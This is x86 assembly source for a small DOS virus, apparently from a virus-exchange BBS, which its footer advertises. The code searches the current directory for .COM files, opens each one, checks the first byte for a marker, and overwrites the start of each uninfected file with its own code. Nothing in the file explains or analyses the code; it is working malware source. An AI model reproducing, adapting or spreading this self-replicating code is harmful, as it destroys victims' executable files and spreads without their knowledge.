tic     segment
        org     100h
        assume  cs:tic, ds:tic, es:tic

len     equ     offset last-100h

start:  mov     si,0100h
        push    si
        mov     ax,cs
        add     ah,10h
        mov     es,ax
        xor     di,di
        mov     cx,len
        rep     movsb
        mov     dx,0FE00h
        mov     ah,1Ah
        int     21h
        mov     dx,offset file
        mov     ah,4Eh
        jmp     short find
retry:  mov     ah,3Eh
        int     21h
        mov     ah,4Fh
find:   push    cs
        pop     ds
        int     21h
        mov     cx,0FE1Eh
        jc      nofile
        mov     dx,cx
        mov     ax,3D02h
        int     21h
        xchg    ax,bx
        push    es
        pop     ds
        mov     dx,di
        mov     ah,3Fh
        int     21h
        add     ax,len
        cmp     byte ptr [di], 0BEh
        je      retry
        push    ax
        xor     cx,cx
        mov     ax,4200h
        cwd
        int     21h
        pop     cx
        mov     ah,40h
        int     21h
        jmp     short retry

nofile: push    cs
        pop     es
        mov     bl,0FCh
        mov     [bx],0AAACh
        mov     [bx+2],0FCE2h
        pop     di
        push    bx
        ret

file    db      '*.COM',0
last    db      0C3h

tic     ends
        end     start

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

